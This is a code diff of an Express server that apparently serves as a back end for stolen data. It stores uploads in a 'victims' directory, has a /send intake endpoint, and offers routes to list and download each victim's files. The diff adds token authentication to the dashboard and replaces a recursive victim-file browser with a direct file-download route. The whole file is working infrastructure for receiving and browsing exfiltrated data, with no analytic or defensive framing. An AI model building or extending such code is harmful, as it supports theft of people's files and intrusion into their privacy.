@@ -13,9 +13,9 @@ const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
   : path.join(__dirname, "victims"); // fallback for local testing
 
 // --- Read secret from environment or fallback for local ---
-const SECRET_TOKEN = process.env.SECRET_TOKEN || "qutgeek";
+const SECRET_TOKEN = process.env.SECRET_TOKEN || "local_dev_token";
 if (!process.env.SECRET_TOKEN) {
-  console.warn("SECRET_TOKEN not set! Using qutgeek (development only).");
+  console.warn("SECRET_TOKEN not set! Using local_dev_token (development only).");
 }
 
 // --- Ensure victims folder exists ---
@@ -31,9 +31,8 @@ if (!process.env.SECRET_TOKEN) {
 
 // --- Root dashboard ---
 app.get("/", async (req, res) => {
-  // Optional: uncomment to require auth
-  // if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
-  //   return res.status(403).send("Unauthorized");
+  if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
+    return res.status(403).send("Unauthorized");
 
   let victims = [];
   try {
@@ -70,43 +69,7 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Browse victim files (recursive) - must be BEFORE /victim/:id ---
-app.get('/victim/:id/*', async (req, res) => {
-  const safeId = path.basename(req.params.id);
-  const victimDir = path.join(VICTIMS_DIR, safeId);
-  const subPath = req.params[0] || '';
-  const fullPath = path.join(victimDir, subPath);
-
-  // Check if it's a directory
-  try {
-    const stats = await fs.stat(fullPath);
-    if (stats.isDirectory()) {
-      const files = await fs.readdir(fullPath);
-      const backLink = subPath ? "/victim/" + safeId + "/" + path.dirname(subPath).replace(/\\/g, "/") : "/victim/" + safeId;
-      res.send(
-        `<h2>Folder: ${subPath || safeId}</h2>
-        <a href="${backLink}">⬅ Back</a>
-        <ul>${files.map(f => {
-          const itemPath = subPath ? `${subPath}/${f}` : f;
-          const itemFullPath = path.join(fullPath, f);
-          const isDir = fs.statSync(itemFullPath).isDirectory();
-          return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, "/")}">${isDir ? "📁 " : ""}${f}${isDir ? "/" : ""}</a></li>`;
-        }).join("")}</ul>`
-      );
-      return;
-    }
-  } catch (err) {}
-
-  // It's a file - download it
-  res.download(fullPath, err => {
-    if (err) {
-      console.error("Download failed:", err);
-      res.status(404).send("File not found");
-    }
-  });
-});
-
-// --- Browse victim root ---
+// --- Browse victim files ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
   const victimDir = path.join(VICTIMS_DIR, safeId);
@@ -121,8 +84,20 @@ app.get("/victim/:id", async (req, res) => {
 
   res.send(
     `<h2>Victim: ${safeId}</h2>
-    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f.replace(/\\/g, "/")}">${f}</a></li>`).join("")}</ul>`
+    <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>`
   );
+});
+
+// --- Download specific file ---
+app.get("/victim/:id/:file", async (req, res) => {
+  const filePath = path.join(
+    VICTIMS_DIR,
+    path.basename(req.params.id),
+    req.params.file
+  );
+  res.download(filePath, err => {
+    if (err) console.error("Download failed:", err);
+  });
 });
 
 // --- Start server ---
